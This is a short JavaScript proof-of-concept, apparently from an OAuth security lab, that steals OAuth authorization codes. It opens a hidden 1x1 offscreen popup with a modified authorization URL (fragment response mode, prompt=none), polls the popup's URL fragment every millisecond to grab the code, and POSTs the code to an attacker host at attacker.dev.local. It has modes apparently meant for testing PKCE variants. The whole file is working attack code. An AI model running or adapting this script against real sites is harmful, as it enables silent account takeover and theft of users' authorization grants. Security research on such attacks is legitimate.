// New window with default flow

const ATTACKER_HOST = 'https://attacker.dev.local:5443'
const MODE = 'default' // 'default' | 'pkce-front' | 'pkce-back'

async function getAuthorizationRequestURL(mode) {
    let queryParams;
    if (mode) {
        queryParams = `?mode=${mode}`
    }
    else {
        queryParams = ''
    }

    let response = await fetch(`/login/start${queryParams}`);
    let data = await response.json();
    let url = `${data.url}&response_mode=fragment&prompt=none`; // modify initial authorization URL
    return url;

}

async function stealAuthorizationResponse(windowObj, timerRef) {
    let hash = windowObj?.location?.hash
    if (hash.includes("code")) {
        windowObj.stop();
        clearInterval(timerRef);
        let code = hash.split('code=')[1];
        windowObj.close();

        response = await sendAuthorizationResponseToAttacker(code, `${ATTACKER_HOST}/authorization-response?mode=${MODE}`);
        if (response?.error === true) {
            return false;
        }
        console.log(`Authorization code: ${code}\nsent to the attacker`);
    }

}

async function sendAuthorizationResponseToAttacker(code, maliciousUrl) {
    let body = {
        code: code,
    }
    let response = await fetch(maliciousUrl, {
        method: 'POST', headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(body)
    });
    response = await response.json();
    return response;
}


(async function () {
    let url = await getAuthorizationRequestURL(MODE);
    let newWindow = window.open(url, 'targetWindow', 'popup, toolbar=no,location=no,status=no,menubar=no,scrollbars=no,resizable=no,width=1,height=1,left=0,screenY=100000, screenX=10000')

    let timer = setInterval(() => stealAuthorizationResponse(newWindow, timer), 1);

    // fallback
    setTimeout(() => {
        clearInterval(timer);
    }, 5000);
})();
